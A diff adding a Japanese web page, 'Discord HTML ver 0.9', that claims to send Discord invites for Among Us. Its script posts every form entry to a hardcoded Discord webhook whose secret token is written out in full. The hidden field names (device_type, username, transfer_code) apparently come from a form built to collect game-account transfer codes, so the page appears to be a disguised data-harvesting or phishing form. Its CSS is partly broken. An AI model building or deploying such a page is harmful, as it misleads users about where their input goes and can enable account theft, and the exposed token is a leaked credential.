@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<script>
+// Discord HTML ver0.9
+</script>
+  <title>フォーム送信</title>
+  <link rel="stylesheet" href="style.css" />
+  
+  <style type="text/css">
+    @import url("");
+
+      box-sizing: border-box;
+      font-family: "M PLUS Rounded 1c", sans-serif;
+    }
+
+    body {
+      height: 100vh;
+      display: grid;
+      place-content: center;
+    }
+
+    .contact-form {
+      border: 1px solid #aaa;
+      padding: 50px 30px;
+    }
+
+    .title {
+      text-align: center;
+      font-size: 20px;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    form {
+      width: 460px;
+      margin: 0 auto;
+    }
+
+    .item {
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+
+    .label {
+      float: left;
+      margin-right: 20px;
+      width: 135px;
+      border-left: solid 3px #2f71ff;
+      padding-left: 10px;
+    }
+
+    .inputs {
+      float: left;
+      width: 300px;
+    }
+
+    input[type="text"],
+    input[type="email"] {
+      border: solid 1px #aaa;
+      padding: 10px;
+      font-size: 15px;
+      border-radius: 5px;
+    }
+
+    textarea {
+      border: solid 1px #aaa;
+      border-radius: 5px;
+      padding: 10px;
+      height: 160px;
+      width: 300px;
+      font-size: 15px;
+    }
+
+    .button-area {
+      text-align: center;
+    }
+
+    input[type="submit"] {
+      background: #4481f1;
+      border: none;
+      color: white;
+      font-size: 17px;
+      font-weight: bold;
+      padding: 10px 20px;
+      margin: 0 5px;
+      border-radius: 5px;
+      box-shadow: 1px 1px 3px black;
+      cursor: pointer;
+    }
+
+    input[type="reset"] {
+      background: #837a7a;
+      border: none;
+      color: white;
+      font-size: 17px;
+      font-weight: bold;
+      padding: 10px 20px;
+      margin: 0 5px;
+      border-radius: 5px;
+      box-shadow: 1px 1px 3px black;
+      cursor: pointer;
+    }
+  </style>
+
+  
+</head>
+<body>
+  <div class="contact-form">
+    <p class="title">Discord HTML ver 0.9</p><center><font size="3">Amongusに discordで招待ができない代わり</font><br><br></center>
+    <form id="contactForm">
+      <div class="item">
+        <label class="label">送る相手の名前(@必須)</label>
+        <input type="text" value="@" class="inputs" name="device_type" required />
+      </div>
+      <div class="item">
+        <label class="label">本文</label>
+        <input type="text" class="inputs" name="username" required />
+      </div>
+      <div class="item">
+        <label class="label">招待内容</label>
+        <input type="text" class="inputs" name="transfer_code" required />
+      </div>
+      <br><font size="2"><font color="red">送ったら1秒間待ってください...</font></font>
+      <div class="button-area">
+        <input type="submit" value="送信" />
+        <input type="button" id="deleteRequest" value="報告板にエラー送信" />
+      </div>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('contactForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+      const submitButton = this.querySelector('input[type="submit"]');
+      submitButton.disabled = true; // ボタンを無効化
+
+      const formData = new FormData(this);
+      const data = {
+        content: `
+          送る相手: ${formData.get('device_type')}
+          本文: ${formData.get('username')}
+          招待内容: ${formData.get('transfer_code')}
+        `
+      };
+
+      setTimeout(() => {
+        fetch('https://discord.com/api/webhooks/1286258403668131860/J_w5IwU8da0N6eRssnjtXyGjFpTt-Qfz9eHG_AGehwG7q18hA51R1Q1VylLavy5nGUSi', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('Success:', data);
+          alert('メッセージが送信されました');
+        })
+        .catch((error) => {
+          console.error('Error:', error);
+          alert('メッセージの送信できたかも？');
+        })
+        .finally(() => {
+          submitButton.disabled = false; // ボタンを再度有効化
+        });
+      }, 1000); // 1秒待機
+    });
+
+    
+</script>
+</body>
+</html>
